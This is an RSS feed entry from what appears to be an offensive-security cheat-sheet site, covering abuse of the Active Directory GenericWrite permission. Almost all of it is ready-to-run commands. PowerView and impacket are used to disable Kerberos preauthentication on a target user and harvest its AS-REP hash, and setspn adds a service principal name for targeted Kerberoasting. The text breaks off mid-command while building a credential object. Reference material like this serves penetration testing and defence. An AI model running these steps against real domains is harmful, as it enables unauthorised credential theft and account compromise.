channel.title: GenericWrite on TLDRBins
channel.description: Recent content in GenericWrite on TLDRBins

item.title: GenericWrite
item.description: Import PowerView.ps1 . .\PowerView.ps1 Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser <target_user> | ConvertFrom-UACValue # Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity <target_user> -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10 Abuse #2 : Kerberoasting by adding spn Add spn # Add spn setspn -a MSSQLSvc/example.com:1433 example.com\target_user # Check Get-DomainUser target_user | Select serviceprincipalname Runas $password = ConvertTo-SecureString 'password' -AsPlainText -Force $cred = New-Object System.
